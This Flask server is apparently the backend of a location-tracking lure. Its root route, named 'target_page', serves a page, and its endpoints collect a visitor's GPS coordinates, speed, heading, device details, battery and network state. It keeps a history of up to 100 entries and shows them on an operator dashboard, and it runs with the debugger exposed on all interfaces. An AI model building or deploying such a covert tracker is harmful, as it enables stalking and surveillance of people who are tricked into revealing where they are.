from flask import Flask, request, render_template, jsonify
import os
from datetime import datetime

app = Flask(__name__)

# =============================================
# DATA STORAGE (No Telegram)
# =============================================

latest_location = {
    "lat": None,
    "lng": None,
    "accuracy": None,
    "altitude": None,
    "heading": None,
    "speed": None,
    "timestamp": None,
    "device_info": None,
    "battery": None,
    "network": None
}
location_history = []

# =============================================
# ROUTES
# =============================================

@app.route('/')
def target_page():
    return render_template('index.html')

@app.route('/send-location', methods=['POST'])
def receive_location():
    global latest_location, location_history

    data = request.get_json()

    location_data = {
        "lat": data.get('lat'),
        "lng": data.get('lng'),
        "accuracy": data.get('accuracy'),
        "altitude": data.get('altitude'),
        "heading": data.get('heading'),
        "speed": data.get('speed'),
        "device_info": data.get('device_info'),
        "battery": data.get('battery'),
        "network": data.get('network'),
        "timestamp": datetime.now().isoformat()
    }

    latest_location = location_data
    location_history.append(location_data)

    if len(location_history) > 100:
        location_history.pop(0)

    print(f"📍 Location Received: {location_data}")
    print(f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    return jsonify({"status": "ok"})

@app.route('/send-battery', methods=['POST'])
def receive_battery():
    data = request.get_json()
    latest_location['battery'] = data
    print(f"🔋 Battery: {data}")
    return jsonify({"status": "ok"})

@app.route('/send-network', methods=['POST'])
def receive_network():
    data = request.get_json()
    latest_location['network'] = data
    print(f"📶 Network: {data}")
    return jsonify({"status": "ok"})

@app.route('/get-location')
def get_location():
    return jsonify(latest_location)

@app.route('/get-history')
def get_history():
    return jsonify(location_history)

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/clear', methods=['POST', 'GET'])
def clear_location():
    global latest_location, location_history
    latest_location = {
        "lat": None, "lng": None, "accuracy": None,
        "altitude": None, "heading": None, "speed": None,
        "timestamp": None, "device_info": None,
        "battery": None, "network": None
    }
    location_history = []
    return jsonify({"status": "cleared"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port, debug=True)